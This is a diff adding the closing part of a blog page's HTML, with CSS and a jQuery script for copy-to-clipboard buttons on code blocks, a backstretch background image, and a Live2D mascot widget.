+      font-size: 13px;
+      font-weight: 700;
+      line-height: 20px;
+      color: #333;
+      white-space: nowrap;
+      vertical-align: middle;
+      cursor: pointer;
+      background-color: #eee;
+      background-image: linear-gradient(#fcfcfc, #eee);
+      border: 1px solid #d5d5d5;
+      border-radius: 3px;
+      user-select: none;
+      outline: 0;
+    }
+
+    .highlight-wrap .copy-btn {
+      transition: opacity .3s ease-in-out;
+      opacity: 0;
+      padding: 2px 6px;
+      position: absolute;
+      right: 4px;
+      top: 8px;
+    }
+
+    .highlight-wrap:hover .copy-btn,
+    .highlight-wrap .copy-btn:focus {
+      opacity: 1
+    }
+
+    .highlight-wrap {
+      position: relative;
+    }
+  </style>
+  <script>
+    $('.highlight').each(function(i, e) {
+      var $wrap = $('<div>').addClass('highlight-wrap');
+      $(e).after($wrap);
+      $wrap.append($('<button>').addClass('copy-btn').append('复制').on('click', function(e) {
+        var code = $(this).parent().find('.code').find('.line').map(function(i, e) {
+          return $(e).text();
+        }).toArray().join('\n');
+        var ta = document.createElement('textarea');
+        var range = document.createRange(); //For Chrome
+        var sel = window.getSelection(); //For Chrome
+        var yPosition = window.pageYOffset || document.documentElement.scrollTop;
+        ta.style.top = yPosition + 'px'; //Prevent page scroll
+        ta.style.position = 'absolute';
+        ta.style.opacity = '0';
+        ta.value = code;
+        ta.textContent = code; //For FireFox
+        ta.contentEditable = true;
+        ta.readOnly = false;
+        document.body.appendChild(ta);
+        range.selectNode(ta);
+        sel.removeAllRanges();
+        sel.addRange(range);
+        ta.setSelectionRange(0, code.length);
+        var result = document.execCommand('copy');
+        
+          if (result) $(this).text('复制成功');
+          else $(this).text('复制失败');
+        
+        ta.blur(); //For iOS
+        $(this).blur();
+      })).on('mouseleave', function(e) {
+        var $b = $(this).find('.copy-btn');
+        setTimeout(function() {
+          $b.text('复制');
+        }, 300);
+      }).append(e);
+    })
+  </script>
+
+
+  
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-backstretch/2.0.4/jquery.backstretch.min.js"></script>
+  <script>
+  $("body").backstretch("https://blogpics-1251691280.file.myqcloud.com/imgs/20190121234042.jpg");
+  </script>
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script></body>
+</html>
